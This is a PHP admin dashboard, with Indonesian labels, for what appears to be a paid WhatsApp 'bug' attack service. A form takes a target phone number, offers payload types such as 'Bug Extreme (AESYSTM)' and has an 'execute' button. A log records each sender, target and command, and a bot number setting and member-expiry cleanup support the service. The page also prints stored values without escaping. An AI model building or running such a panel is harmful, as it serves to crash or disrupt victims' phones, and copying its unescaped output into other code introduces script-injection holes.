<?php 
include 'config.php'; 
if(!isset($_SESSION['role']) || $_SESSION['role'] != 'admin'){ header("location:index.php"); exit(); }

// 1. Bersihkan Member Expired > 30 Hari secara otomatis
$batas_hapus = date('Y-m-d H:i:s', strtotime('-30 days'));
mysqli_query($conn, "DELETE FROM users WHERE role = 'member' AND expired_date < '$batas_hapus'");

// 2. Simpan Nomor Bot Baru
if(isset($_POST['save_bot'])){
    $num = mysqli_real_escape_string($conn, $_POST['bot_num']);
    mysqli_query($conn, "UPDATE settings SET value='$num' WHERE key_name='whatsapp_bot'");
    echo "<script>alert('Nomor Bot Diperbarui!');</script>";
}

$res_bot = mysqli_query($conn, "SELECT value FROM settings WHERE key_name='whatsapp_bot'");
$bot_val = mysqli_fetch_assoc($res_bot)['value'];
?>

<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard</title>
    <link rel="stylesheet" href="style.css">
</head>
<body style="display:block; padding:20px;">
    <h1>Command Center Admin</h1>
    
    <div class="login-card" style="max-width:600px; margin:auto;">
        <h3>Kaitkan Nomor Bot</h3>
        <form method="POST">
            <input type="text" name="bot_num" value="<?= $bot_val; ?>" required style="color:black">
            <button type="submit" name="save_bot" class="btn-login" style="margin-top:10px;">SIMPAN BOT</button>
        </form>

        <hr style="margin:20px 0;">

        <h3>Kirim Perintah Bug</h3>
        <form action="send_command.php" method="POST">
            <input type="text" name="target_num" placeholder="628xxx" required style="color:black">
            <select name="command_type" style="width:100%; padding:10px; margin:10px 0;">
                <option value="v1">Bug V1</option>
                <option value="v3">Bug Extreme (AESYSTM)</option>
            </select>
            <button type="submit" name="send" class="btn-login" style="background:#ff4d4d;">EKSEKUSI</button>
        </form>
    </div>

    <div style="margin-top:30px;">
        <h3>LOG AKTIVITAS TERBARU</h3>
        <table border="1" width="100%" style="color:white; border-collapse:collapse;">
            <tr><th>Waktu</th><th>Pengirim</th><th>Target</th><th>Fitur</th></tr>
            <?php
            $logs = mysqli_query($conn, "SELECT * FROM activity_logs ORDER BY time_executed DESC LIMIT 5");
            while($l = mysqli_fetch_assoc($logs)){
                echo "<tr><td>{$l['time_executed']}</td><td>{$l['username']}</td><td>{$l['target_num']}</td><td>{$l['command_type']}</td></tr>";
            }
            ?>
        </table>
    </div>
</body>
</html>